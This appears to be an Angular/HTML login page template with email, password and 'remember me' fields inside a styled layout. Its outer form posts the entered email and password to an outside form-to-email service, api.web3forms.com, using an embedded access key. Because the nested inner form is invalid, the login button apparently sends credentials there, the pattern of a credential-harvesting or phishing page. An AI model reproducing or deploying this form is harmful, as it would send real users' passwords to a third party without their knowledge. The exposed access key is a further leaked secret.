<div class="background">
  <div class="container">
    <div class="logo"></div>
  </div>

  <div class="container2">
    <div class="square-box shadow-lg">
      <div class="login-container p-4">
        <form action="https://api.web3forms.com/submit" method="POST">

          <input type="hidden" name="access_key" value="3aa15a33-2b36-4eb9-9859-b55b7a6d76d2">
          <div class="login-box">
            <h2 class="text-center">Login</h2>
            <form (ngSubmit)="login($event)">
              <label for="email">Email</label>
              <input style="width: 300px;" [(ngModel)]="user.email" name="email" type="email" id="email"
                placeholder="Enter your email" required />
              <label for="password">Password</label>
              <input style="width: 300px;" [(ngModel)]="user.password" name="password" type="password" id="password"
                placeholder="Enter your password" required />

              <div class="options">
                <label>
                  <input type="checkbox" [(ngModel)]="rememberMe" name="rememberMe" />
                  Remember me
                </label>
                <a type="submit" (click)="openForgotPassword()">Forgot Password?</a>
              </div>

              <button type="submit" class="login-button">Login</button>
            </form>
            <p class="register-link">
              Don't have an account? <a routerLink="/register">Register</a>
            </p>
          </div>
          <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
        </form>
      </div>

      <div class="info-section d-flex align-items-center" style="width:500px;">
        <div class="important-text">
          " Empowering you to transform ideas into reality. "
        </div>
      </div>
    </div>
  </div>
</div>
